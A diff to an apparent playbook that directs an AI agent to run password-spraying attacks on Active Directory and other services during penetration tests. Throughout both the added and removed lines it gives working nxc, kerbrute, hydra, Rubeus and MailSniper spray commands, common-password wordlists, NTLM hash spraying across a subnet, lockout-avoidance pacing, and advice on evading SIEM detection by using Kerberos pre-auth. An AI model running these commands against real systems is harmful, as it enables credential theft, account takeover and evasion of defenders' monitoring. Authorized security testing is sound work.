@@ -170,432 +170,291 @@ bloodyAD -u user -p 'Password123' -d DOMAIN.LOCAL --host DC_IP \
 Get-DomainFineGrainedPasswordPolicy
 ```
 
-## Step 2: Build Username List
+## Step 2: Verify Usernames
 
-### From Prior Enumeration
+The orchestrator passes usernames in the agent prompt. Write them to
+`engagement/evidence/usernames.txt` as described in the File-Based Spray
+Model section above.
 
-If **ad-discovery** already ran, use its username list. Otherwise:
+If the orchestrator did NOT provide usernames and you need to enumerate:
 
 ```bash
 # RID cycling (unauthenticated)
 nxc smb DC01.DOMAIN.LOCAL -u 'guest' -p '' --rid-brute 10000 \
-  | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
+  | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > engagement/evidence/usernames.txt
 
 # kerbrute user enumeration (Kerberos — stealthier, generates 4771)
-kerbrute userenum -d DOMAIN.LOCAL --dc DC01.DOMAIN.LOCAL usernames.txt
-
-# With valid creds — LDAP full user list
-nxc ldap DC01.DOMAIN.LOCAL -u 'user' -p 'Password123' --users \
-  | awk '{print $5}' > users.txt
+kerbrute userenum -d DOMAIN.LOCAL --dc DC01.DOMAIN.LOCAL \
+  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
 ```
 
-### Username Wordlists
+## File-Based Spray Model
 
-If no enumeration is possible, use statistically likely usernames:
-- https://github.com/insidetrust/statistically-likely-usernames
-- Common naming conventions: `first.last`, `flast`, `firstl`, `first_last`
+**All spraying uses wordlist files. Never pass passwords inline to tools.**
 
-## Spray Intensity Tiers
+The agent creates files in `engagement/evidence/` before spraying. This
+ensures reproducibility, prevents shell escaping bugs, and lets the operator
+review what will be tested.
 
-The orchestrator passes a spray intensity tier in the agent prompt. Check for
-it and build the password list accordingly. If no tier is specified, default
-to **light**.
+### Files to Create
 
-### Light Spray (~30 passwords per user)
+| File | Contents | When |
+|------|----------|------|
+| `engagement/evidence/usernames.txt` | One username per line | Always, from orchestrator-provided list |
+| `engagement/evidence/wordlist.txt` | Agent-generated context passwords (domain/hostname/season — NOT usernames) | Always, before first spray round |
+| (SecLists path) | External wordlist, referenced by path | All tiers (size varies by tier) |
 
-Start with username-as-password (see Username-as-Password Generation below),
-then spray these common defaults one password at a time against all users:
+### wordlist.txt — Agent-Generated Context Passwords
 
-```
-Password1
-Welcome1
-P@ssw0rd
-Password123
-Changeme1!
-Welcome01
-letmein
-admin
-password
-123456
-```
+Build `wordlist.txt` from known engagement context. These are the ONLY
+passwords the agent may generate. **Do NOT invent, guess, or improvise
+passwords beyond these patterns.**
 
-Add season+year for current and previous seasons (generate dynamically):
-```
+**Do NOT include usernames in wordlist.txt.** Username-as-password is handled
+separately in Round 1 with special 1:1 `--no-bruteforce` matching. Putting
+usernames in wordlist.txt would cross-spray them against every user in Round 2
+(user A's name tested as password for user B), which is noisy and rarely
+productive.
+
+**Patterns to include (substitute real values from context):**
+
+```bash
+cat > engagement/evidence/wordlist.txt << 'WORDLIST'
+# === Domain/hostname/company name derivatives ===
+{DomainName}1!
+{domainname}1!
+{DomainName}123
+{domainname}123
+{Hostname}1!
+{hostname}1!
+{Hostname}123
+{hostname}123
+
+# === Season + year (current + previous, generate dynamically) ===
 Winter2026!
 Spring2026!
 Autumn2025!
 Summer2025!
+Winter2025!
+Spring2025!
+WORDLIST
 ```
 
-Add domain/hostname/company derivatives (substitute from context):
-```
-{DomainName}1!
-{DomainName}123
-{Hostname}1!
-```
-Lowercase variants too (e.g., `Megabank1!` and `megabank1!`).
+Replace `{DomainName}` and `{Hostname}` with actual values (e.g., `Megabank`,
+`Monteverde`). Use both the short name and FQDN where they differ.
 
-### Medium Spray (~10k passwords)
+**That is the complete list.** Do not add `Password1`, `Welcome1`, or other
+generic passwords — those come from the SecLists file. Do not add creative
+guesses like `azure_123!` or `Demo123!`. The purpose of `wordlist.txt` is
+context-specific passwords that no generic wordlist would contain.
 
-Everything in Light (username-as-password, common defaults, season+year,
-domain/hostname derivatives), plus:
+### usernames.txt
+
 ```bash
-# SecLists 10k most common
-/opt/seclists/Passwords/Common-Credentials/10k-most-common.txt
+# Write usernames from orchestrator prompt
+cat > engagement/evidence/usernames.txt << 'USERS'
+Administrator
+mhope
+SABatchJobs
+svc-ata
+svc-bexec
+svc-netapp
+dgalanos
+roleary
+smorgan
+USERS
 ```
 
-### Heavy Spray (~100k passwords)
+## Spray Intensity Tiers
 
-Everything in Medium (username-as-password, common defaults, season+year,
-domain/hostname derivatives, SecLists 10k), plus:
-```bash
-# SecLists 100k most common (NCSC)
-/opt/seclists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt
-```
+The orchestrator passes a spray intensity tier and target services in the
+agent prompt. Check for them and build the spray plan accordingly. If no tier
+is specified, default to **light**.
+
+**Every tier sprays the same wordlist.txt. Tiers differ only in which
+SecLists file is appended.**
+
+### Light Spray
+
+1. Username-as-password round (special handling — see Spray Execution below)
+2. `engagement/evidence/wordlist.txt` (agent-generated context passwords)
+3. `/usr/share/seclists/Passwords/Common-Credentials/500-worst-passwords.txt` (~500 passwords)
+
+### Medium Spray
+
+1. Username-as-password round
+2. `engagement/evidence/wordlist.txt`
+3. `/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt` (~10k passwords)
+
+### Heavy Spray
+
+1. Username-as-password round
+2. `engagement/evidence/wordlist.txt`
+3. `/usr/share/seclists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt` (~100k passwords)
 
 ### Custom Wordlist
 
-Operator-provided path, used as-is. Still prepend the username-as-password
-round before the custom wordlist.
+1. Username-as-password round
+2. `engagement/evidence/wordlist.txt`
+3. Operator-provided wordlist path
 
-## Username-as-Password Generation
+## Spray Execution
 
-**Always run this first**, regardless of tier. Each user is tested only with
-their OWN username as the password (both original case and lowercase), never
-cross-sprayed with another user's name.
+**Sequential. One service at a time. One spray round at a time.**
+
+The orchestrator specifies which services to spray (from the operator's
+selection). Spray each service in the order listed. Complete ALL rounds on
+one service before moving to the next.
+
+**Do NOT:**
+- Run multiple spray commands in parallel or as background tasks
+- Spray the same password list on multiple services simultaneously
+- Skip ahead to SecLists before completing wordlist.txt
+- Invent passwords not in the wordlist files
+
+### Round 1: Username-as-Password (per service)
+
+Each user is tested only with their OWN username as the password (original
+case + lowercase). This requires special `--no-bruteforce` handling for 1:1
+line matching.
 
 ```bash
-# Generate matched user/pass files for 1:1 username-as-password testing
-cp users.txt user-as-pass.txt                    # original case
-tr '[:upper:]' '[:lower:]' < users.txt >> user-as-pass.txt  # + lowercase
+# Generate matched user/pass files for 1:1 testing
+cp engagement/evidence/usernames.txt /tmp/uap-pass.txt
+tr '[:upper:]' '[:lower:]' < engagement/evidence/usernames.txt >> /tmp/uap-pass.txt
+cat engagement/evidence/usernames.txt engagement/evidence/usernames.txt > /tmp/uap-users.txt
 
-# Duplicate users.txt to match line count (original + lowercase = 2x)
-cat users.txt users.txt > user-as-pass-users.txt
-
-# Spray with 1:1 matching (each line in user file matched to same line in pass file)
-nxc smb TARGET -u user-as-pass-users.txt -p user-as-pass.txt \
+# Spray with 1:1 matching
+nxc smb TARGET -u /tmp/uap-users.txt -p /tmp/uap-pass.txt \
   --no-bruteforce --continue-on-success -d DOMAIN
 ```
 
-**Why `--no-bruteforce` here:** In this specific case, `--no-bruteforce`
-ensures line-by-line matching — user1 is tested with pass1, user2 with pass2.
-This is correct for username-as-password where each password is unique to its
-user.
+**Why `--no-bruteforce` here:** Ensures line-by-line matching — user1 is
+tested with pass1, user2 with pass2. This is correct for username-as-password
+where each password is unique to its user.
 
-## Step 3: Build Password List
+**If any hit is found:** Record it, note which user/password, and continue
+spraying remaining rounds (other users may also have weak passwords).
 
-After the username-as-password round, build the wordlist for standard spray
-mode based on the selected tier.
+### Round 2: wordlist.txt (per service)
 
-### Standard Spray Mode (Wordlist)
-
-After username-as-password, switch to standard spray — one password tested
-against all users per round. Do NOT use `--no-bruteforce` for wordlist spray:
+Standard spray — every password tested against all users:
 
 ```bash
-# Standard spray: one password against all users
-nxc smb TARGET -u users.txt -p 'Password1' --continue-on-success -d DOMAIN
-
-# Multiple passwords from file (nxc sprays one at a time internally)
-nxc smb TARGET -u users.txt -p passwords.txt \
-  --continue-on-success --no-bruteforce -d DOMAIN
+nxc smb TARGET -u engagement/evidence/usernames.txt \
+  -p engagement/evidence/wordlist.txt \
+  --no-bruteforce --continue-on-success -d DOMAIN
 ```
 
-### Smart Patterns (High Success Rate)
+### Round 3: SecLists Wordlist (per service, tier-dependent)
 
-```
-# Season + Year (most common AD password pattern)
-Spring2025!
-Summer2025!
-Autumn2025!
-Winter2025!
-Spring2026!
-
-# Company name + number/special
-CompanyName1!
-CompanyName123
-CompanyName2025!
-
-# Month + Year
-January2025!
-February2026!
-
-# Common defaults
-Password1
-Password123
-Welcome1
-Welcome01
-P@ssw0rd
-P@ssw0rd1
-Changeme1!
-```
-
-### Generation with maskprocessor
+Same approach, pointing to the tier-appropriate SecLists file:
 
 ```bash
-# Inline generation with NetExec
-nxc smb DC01.DOMAIN.LOCAL -u users.txt -p "$(mp64.bin 'Pass@wor?l?a')"
+# Light tier
+nxc smb TARGET -u engagement/evidence/usernames.txt \
+  -p /usr/share/seclists/Passwords/Common-Credentials/500-worst-passwords.txt \
+  --no-bruteforce --continue-on-success -d DOMAIN
+
+# Medium tier
+nxc smb TARGET -u engagement/evidence/usernames.txt \
+  -p /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
+  --no-bruteforce --continue-on-success -d DOMAIN
+
+# Heavy tier
+nxc smb TARGET -u engagement/evidence/usernames.txt \
+  -p /usr/share/seclists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt \
+  --no-bruteforce --continue-on-success -d DOMAIN
 ```
 
-### SpearSpray Per-User Patterns
+### Service Protocol Commands
 
-SpearSpray generates passwords per-user based on their account metadata
-(pwdLastSet date, username). Patterns include:
-
-```
-{name}{separator}{year}{suffix}      # John.2025!
-{season_en}{separator}{year}{suffix}  # Spring.2025!
-{month_en}{separator}{year}{suffix}   # January.2026!
-{samaccountname}{suffix}              # jsmith!
-```
-
-## Step 4: Pre-Spray Safety Check
-
-### Check badPwdCount Per User
+Use `nxc` (netexec) for all supported protocols. Only fall back to `hydra`
+for protocols netexec does not support.
 
 ```bash
-# Shows current bad password count for each user
-nxc ldap DC01.DOMAIN.LOCAL -u 'user' -p 'Password123' --users
-# Output includes badpwdcount column
+# SMB (most common)
+nxc smb TARGET -u USERFILE -p PASSFILE --no-bruteforce --continue-on-success -d DOMAIN
+
+# LDAP
+nxc ldap TARGET -u USERFILE -p PASSFILE --no-bruteforce --continue-on-success
+
+# WinRM (if 5985/5986 open)
+nxc winrm TARGET -u USERFILE -p PASSFILE --no-bruteforce --continue-on-success
+
+# RDP
+nxc rdp TARGET -u USERFILE -p PASSFILE --no-bruteforce --continue-on-success
+
+# MSSQL
+nxc mssql TARGET -u USERFILE -p PASSFILE --no-bruteforce --continue-on-success
+
+# SSH
+nxc ssh TARGET -u USERFILE -p PASSFILE --no-bruteforce --continue-on-success
+
+# FTP (hydra — nxc does not support FTP)
+hydra -L USERFILE -P PASSFILE ftp://TARGET -u -t 4 -o spray-ftp.log
+
+# HTTP POST form (hydra — adjust form params and failure string)
+hydra -L USERFILE -P PASSFILE TARGET http-post-form \
+  "/login:username=^USER^&password=^PASS^:F=Invalid credentials" \
+  -u -t 4 -o spray-web.log
 ```
 
-Identify accounts already close to lockout threshold and exclude them from
-spray. The builtin **Administrator (RID 500) cannot be locked out** regardless
-of policy — always safe to spray.
+**Critical flags:**
+- `--no-bruteforce` — spray mode (one password per user, then next password).
+  Without this, netexec tests all passwords per user = lockout risk.
+- `--continue-on-success` — don't stop at first valid credential.
+- `-d DOMAIN` — for domain-joined services (SMB, WinRM). Omit for local auth.
 
-### Determine Safe Spray Rate
+## Lockout-Aware Spray Pacing
+
+If the lockout policy has a non-zero threshold, pace the spray to avoid
+lockouts:
 
 ```
 safe_attempts = lockout_threshold - 2  # leave buffer
 wait_time = observation_window + 1 minute  # wait for counter reset
 ```
 
-Example: threshold=5, window=30min -> spray 3 passwords, wait 31 minutes.
+Example: threshold=5, window=30min → spray 3 passwords per user, wait 31
+minutes, resume. The builtin **Administrator (RID 500) cannot be locked out**
+regardless of policy — always safe to spray.
 
-## Step 5: Spray — Kerberos Pre-Auth (Stealthiest)
+If you have authenticated access, check current badPwdCount per user before
+spraying to identify accounts already close to lockout:
+```bash
+nxc ldap DC01.DOMAIN.LOCAL -u 'user' -p 'Password123' --users
+```
 
-Kerberos pre-auth spraying generates Event **4771** (Kerberos pre-authentication
-failure) instead of **4625** (logon failure). Many SIEM rules only alert on 4625.
+## OPSEC: Kerberos vs NTLM Spraying
 
-### kerbrute (Recommended)
+| Protocol | Detection Event | Commonly Monitored? |
+|----------|----------------|---------------------|
+| Kerberos pre-auth (kerbrute) | 4771 (pre-auth failure) | Less commonly |
+| SMB/NTLM (netexec) | 4625 (logon failure) | Yes, standard SIEM rule |
+| LDAP (netexec) | 4625 (logon failure) | Yes |
+
+For OPSEC-sensitive engagements where detection matters, use kerbrute for
+Kerberos pre-auth spraying instead of netexec SMB/LDAP. For CTF/HTB or
+engagements where OPSEC is not a concern, netexec is simpler and preferred.
+
+### kerbrute (Kerberos Pre-Auth)
 
 ```bash
-# Single password against all users
-kerbrute passwordspray -d DOMAIN.LOCAL --dc DC01.DOMAIN.LOCAL \
-  users.txt 'Spring2026!'
-
-# With delay (ms between requests)
-kerbrute passwordspray -d DOMAIN.LOCAL --dc DC01.DOMAIN.LOCAL \
-  users.txt 'Spring2026!' --delay 100
-
-# With output file
 kerbrute passwordspray -d DOMAIN.LOCAL --dc DC01.DOMAIN.LOCAL \
   users.txt 'Spring2026!' -v -o spray-round1.log
 ```
 
-### SpearSpray (PSO-Aware, Most Sophisticated)
-
-```bash
-# Basic spray
-spearspray -u pentester -p 'Password123' -d DOMAIN.LOCAL \
-  -dc DC01.DOMAIN.LOCAL
-
-# Custom LDAP filter (target specific OU or group)
-spearspray -u pentester -p 'Password123' -d DOMAIN.LOCAL \
-  -dc DC01.DOMAIN.LOCAL \
-  -q "(&(objectCategory=person)(objectClass=user)(department=IT))"
-
-# Rate-limited with jitter
-spearspray -u pentester -p 'Password123' -d DOMAIN.LOCAL \
-  -dc DC01.DOMAIN.LOCAL -t 5 -j 3,5 --max-rps 10
-
-# Leave 2 attempts buffer before lockout (default)
-spearspray -u pentester -p 'Password123' -d DOMAIN.LOCAL \
-  -dc DC01.DOMAIN.LOCAL -thr 2
-
-# LDAPS
-spearspray -u pentester -p 'Password123' -d DOMAIN.LOCAL \
-  -dc DC01.DOMAIN.LOCAL --ssl
-
-# Mark owned users in BloodHound Neo4j
-spearspray -u pentester -p 'Password123' -d DOMAIN.LOCAL \
-  -dc DC01.DOMAIN.LOCAL -nu neo4j -np bloodhound \
-  --uri bolt://localhost:7687
-```
-
-### Rubeus (Windows)
-
-```powershell
-# Spray password list against all domain users
-.\Rubeus.exe brute /passwords:passwords.txt /outfile:spray-results.txt
-
-# Specific user list
-.\Rubeus.exe brute /users:users.txt /passwords:passwords.txt /outfile:spray-results.txt
-```
-
-## Step 6: Spray — NTLM (Fallback)
-
-Use when Kerberos spraying is not viable (e.g., port 88 blocked).
-Generates Event **4625** — more commonly monitored.
-
-### NetExec (Multi-Protocol)
-
-```bash
-# SMB spray (most common)
-nxc smb DC01.DOMAIN.LOCAL -u users.txt -p 'Spring2026!' \
-  --continue-on-success --no-bruteforce -d DOMAIN.LOCAL
-
-# LDAP spray
-nxc ldap DC01.DOMAIN.LOCAL -u users.txt -p 'Spring2026!' \
-  --continue-on-success --no-bruteforce
-
-# WinRM spray (if 5985 is open)
-nxc winrm DC01.DOMAIN.LOCAL -u users.txt -p 'Spring2026!' \
-  --continue-on-success --no-bruteforce
-
-# RDP spray
-nxc rdp DC01.DOMAIN.LOCAL -u users.txt -p 'Spring2026!' \
-  --continue-on-success --no-bruteforce
-
-# MSSQL spray
-nxc mssql DB01.DOMAIN.LOCAL -u users.txt -p 'Spring2026!' \
-  --continue-on-success --no-bruteforce
-
-# SSH spray
-nxc ssh TARGET -u users.txt -p 'Spring2026!' \
-  --continue-on-success --no-bruteforce
-
-# Multiple passwords (spray mode — one password per user, then next password)
-nxc smb DC01.DOMAIN.LOCAL -u users.txt -p passwords.txt \
-  --continue-on-success --no-bruteforce -d DOMAIN.LOCAL
-```
-
-**Critical flags:**
-- `--no-bruteforce` — spray mode (one password per user), NOT brute-force
-  (all passwords per user). Brute-force mode will lock accounts.
-- `--continue-on-success` — don't stop at first valid credential.
-
-### DomainPasswordSpray (Windows, Domain-Joined)
-
-```powershell
-# Auto-generates user list from domain, checks policy before spraying
-Invoke-DomainPasswordSpray -Password 'Spring2026!'
-
-# With user list
-Invoke-DomainPasswordSpray -UserList users.txt -Password 'Spring2026!'
-
-# Multiple passwords with output
-Invoke-DomainPasswordSpray -UserList users.txt -Domain DOMAIN.LOCAL \
-  -PasswordList passwords.txt -OutFile spray-results.txt
-```
-
-### spray.sh (Lockout-Period Aware)
-
-```bash
-# Built-in lockout timing: attempts per period, lockout minutes
-spray.sh -smb DC01.DOMAIN.LOCAL users.txt passwords.txt \
-  3 30 DOMAIN.LOCAL
-# Sprays 3 passwords, waits 30 minutes, repeats
-```
-
 ### Hash Spray (Lateral Movement)
 
+When you have a recovered NTLM hash, spray it across targets:
 ```bash
-# Spray a recovered NTLM hash across subnet
 nxc smb 10.10.10.0/24 -u 'Administrator' \
   -H 'aad3b435b51404eeaad3b435b51404ee:NTHASH' \
   --local-auth | grep "Pwn3d"
 ```
 
-## Step 7: Spray — OWA / Exchange
-
-When Outlook Web Access or Exchange Web Services are exposed.
-
-```bash
-# Metasploit OWA
-use auxiliary/scanner/http/owa_login
-set RHOST mail.domain.com
-set USER_FILE users.txt
-set PASS_FILE passwords.txt
-run
-
-# Ruler (Exchange)
-ruler-linux64 --domain DOMAIN.LOCAL -k brute \
-  --users users.txt --passwords passwords.txt --delay 0 --verbose
-```
-
-```powershell
-# MailSniper (PowerShell)
-Invoke-PasswordSprayEWS -ExchHostname mail.domain.com -UserList users.txt \
-  -Password 'Spring2026!'
-
-# Invoke-PasswordSprayOWA
-Invoke-PasswordSprayOWA -ExchHostname mail.domain.com -UserList users.txt \
-  -Password 'Spring2026!'
-```
-
-## Step 8: Spray — SSH, Web Login, Databases (hydra)
-
-For non-AD services where netexec doesn't apply, use hydra. Hydra supports
-spray mode via `-u` (try each password against all users before next password).
-
-### SSH
-
-```bash
-# NetExec SSH spray (preferred — same interface as other protocols)
-nxc ssh TARGET -u users.txt -p passwords.txt \
-  --continue-on-success --no-bruteforce
-
-# Hydra SSH spray (-u = spray mode, -t 4 = parallel tasks)
-hydra -L users.txt -P passwords.txt ssh://TARGET -u -t 4 -o spray-ssh.log
-```
-
-### Web Login Forms (HTTP POST)
-
-```bash
-# Hydra HTTP POST form spray
-# Adjust form parameters and failure string to match the target
-hydra -L users.txt -P passwords.txt TARGET http-post-form \
-  "/login:username=^USER^&password=^PASS^:F=Invalid credentials" \
-  -u -t 4 -o spray-web.log
-
-# HTTPS variant
-hydra -L users.txt -P passwords.txt TARGET https-post-form \
-  "/login:username=^USER^&password=^PASS^:F=Invalid credentials" \
-  -u -t 4 -o spray-web.log
-
-# HTTP Basic Auth
-hydra -L users.txt -P passwords.txt TARGET http-get / -u -t 4
-```
-
-### MySQL
-
-```bash
-# Hydra MySQL spray
-hydra -L users.txt -P passwords.txt mysql://TARGET -u -t 4 -o spray-mysql.log
-
-# NetExec does not support MySQL — use hydra
-```
-
-### MSSQL (non-domain)
-
-```bash
-# NetExec MSSQL (preferred for domain-joined instances)
-nxc mssql TARGET -u users.txt -p passwords.txt \
-  --continue-on-success --no-bruteforce
-
-# Hydra MSSQL (for standalone instances)
-hydra -L users.txt -P passwords.txt mssql://TARGET -u -t 4 -o spray-mssql.log
-```
-
-**hydra flags:**
-- `-u` — spray mode (loop passwords, not users). Without this, hydra brute-forces each user sequentially, which risks lockout.
-- `-t 4` — limit parallel tasks to avoid overwhelming the service
-- `-o <file>` — save results to file
-- `-L` / `-P` — user/password list files
-- `-l` / `-p` — single user/password (for targeted testing)
-
-## Step 9: Validate and Exploit Hits
+## Step 3: Validate and Exploit Hits
 
 ### Verify Access Level
 
@@ -638,7 +497,7 @@ nxc smb DC01.DOMAIN.LOCAL -u 'valid_user' -p 'CrackedPass' \
   -d DOMAIN.LOCAL --pass-pol
 ```
 
-## Step 10: Escalate or Pivot
+## Step 4: Escalate or Pivot
 
 After finding valid credentials:
 - **Get a TGT immediately** and switch to Kerberos auth for all future actions:
@@ -715,17 +574,6 @@ sudo ntpdate DC_IP
 # or
 sudo rdate -n DC_IP
 ```
-
-### Kerberos Pre-Auth vs NTLM Detection
-
-| Protocol | Detection Event | Commonly Monitored? |
-|----------|----------------|---------------------|
-| Kerberos pre-auth | 4771 (pre-auth failure) | Less commonly |
-| SMB/NTLM | 4625 (logon failure) | Yes, standard SIEM rule |
-| LDAP | 4625 (logon failure) | Yes |
-| OWA/HTTP | Web server logs | Varies |
-
-Prefer Kerberos pre-auth (kerbrute, SpearSpray) for lowest detection profile.
 
 ### No Lockout Threshold (0)
 
